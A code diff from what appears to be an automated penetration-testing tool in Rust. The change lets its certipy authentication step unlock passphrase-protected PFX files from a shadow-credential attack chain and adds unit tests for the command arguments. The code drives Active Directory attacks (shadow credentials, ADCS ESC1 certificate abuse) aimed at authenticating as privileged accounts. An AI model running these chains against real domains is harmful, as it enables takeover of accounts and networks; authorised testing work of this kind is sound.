@@ -28,7 +28,7 @@ fn render_chain_output(steps: &[(&str, &ToolOutput)]) -> (String, String) {
 /// Milliseconds since the Unix epoch, or 0 if the system clock predates it.
 /// Used to make certipy output filenames unique so certipy's interactive
 /// "Overwrite? (y/n)" prompt never fires and kills a non-interactive run.
-fn epoch_millis() -> u128 {
+pub(crate) fn epoch_millis() -> u128 {
     std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .map(|d| d.as_millis())
@@ -208,24 +208,44 @@ pub fn build_certipy_request_command(args: &Value) -> Result<CommandBuilder> {
 /// Authenticate with a PFX certificate using Certipy.
 ///
 /// Required args: `pfx_path`, `dc_ip`, `domain`
+/// Optional args: `pfx_password` (passphrase that opens the PFX)
+///
+/// A PFX exported by [`crate::acl::pywhisker`] is always encrypted, so stage
+/// two of a shadow-credential chain needs `certipy auth -password` or it dies
+/// on `Failed to load PFX file: Invalid password or PKCS12 data` with the key
+/// credential already planted. `certipy` gained `-password` on the `auth`
+/// subcommand in 5.0.0; the flag is emitted only when a passphrase actually
+/// applies, so `certipy req` output — unencrypted, and the input to every ADCS
+/// chain in this module — is invoked exactly as before.
 pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
-    let pfx_path = required_str(args, "pfx_path")?;
-    let dc_ip = required_str(args, "dc_ip")?;
-    let domain = required_str(args, "domain")?;
+    let cmd = build_certipy_auth(args)?;
 
     // Certipy auth writes .ccache based on cert subject (e.g. administrator.ccache)
     // and does NOT support -out. Remove existing .ccache files to prevent the
     // interactive "Overwrite? (y/n)" prompt that kills non-interactive runs.
     remove_ccache_files(None).await;
 
-    CommandBuilder::new("certipy")
+    cmd.execute().await
+}
+
+#[doc(hidden)]
+pub fn build_certipy_auth(args: &Value) -> Result<CommandBuilder> {
+    let pfx_path = required_str(args, "pfx_path")?;
+    let dc_ip = required_str(args, "dc_ip")?;
+    let domain = required_str(args, "domain")?;
+
+    let mut cmd = CommandBuilder::new("certipy")
         .arg("auth")
         .flag_visible("-pfx", pfx_path)
         .flag("-dc-ip", dc_ip)
         .flag("-domain", domain)
-        .timeout_secs(120)
-        .execute()
-        .await
+        .timeout_secs(120);
+
+    if let Some(passphrase) = crate::acl::shadow_cred_pfx_password(args, pfx_path) {
+        cmd = cmd.flag("-password", passphrase);
+    }
+
+    Ok(cmd)
 }
 
 /// Perform Certipy Shadow Credentials attack (auto mode).
@@ -1549,6 +1569,77 @@ mod tests {
         assert_eq!(required_str(&args, "pfx_path").unwrap(), "/tmp/admin.pfx");
         assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
         assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
+    }
+
+    fn certipy_auth_flag(args: &serde_json::Value, flag: &str) -> Option<String> {
+        let cmd = super::build_certipy_auth(args).unwrap();
+        let argv = cmd.args_for_test();
+        let idx = argv.iter().position(|a| a == flag)?;
+        argv.get(idx + 1).cloned()
+    }
+
+    #[test]
+    fn certipy_auth_unlocks_a_pywhisker_pfx() {
+        let args = json!({
+            "pfx_path": "/tmp/ares_shadowcred_svc_sql_1754000000000.pfx",
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        });
+        assert_eq!(
+            certipy_auth_flag(&args, "-password").as_deref(),
+            Some(crate::acl::SHADOW_CRED_PFX_PASSPHRASE)
+        );
+    }
+
+    #[test]
+    fn certipy_auth_leaves_an_adcs_pfx_unchanged() {
+        let args = json!({
+            "pfx_path": "/tmp/cert_ESC1_1754000000000.pfx",
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        });
+        assert!(certipy_auth_flag(&args, "-password").is_none());
+        let cmd = super::build_certipy_auth(&args).unwrap();
+        assert_eq!(
+            cmd.args_for_test(),
+            [
+                "auth",
+                "-pfx",
+                "/tmp/cert_ESC1_1754000000000.pfx",
+                "-dc-ip",
+                "192.168.58.10",
+                "-domain",
+                "contoso.local"
+            ]
+        );
+    }
+
+    #[test]
+    fn certipy_auth_takes_an_explicit_pfx_password() {
+        let args = json!({
+            "pfx_path": "/tmp/operator_chosen.pfx",
+            "pfx_password": "OperatorChosen1!",
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        });
+        assert_eq!(
+            certipy_auth_flag(&args, "-password").as_deref(),
+            Some("OperatorChosen1!")
+        );
+    }
+
+    #[test]
+    fn certipy_auth_keeps_the_pfx_path_readable_but_masks_the_passphrase() {
+        let args = json!({
+            "pfx_path": "/tmp/ares_shadowcred_svc_sql_1754000000000.pfx",
+            "dc_ip": "192.168.58.10",
+            "domain": "contoso.local"
+        });
+        let line = super::build_certipy_auth(&args)
+            .unwrap()
+            .redacted_command_line();
+        assert!(line.contains("/tmp/ares_shadowcred_svc_sql_1754000000000.pfx"));
+        assert!(!line.contains(crate::acl::SHADOW_CRED_PFX_PASSPHRASE));
     }
 
     // --- certipy_shadow ---
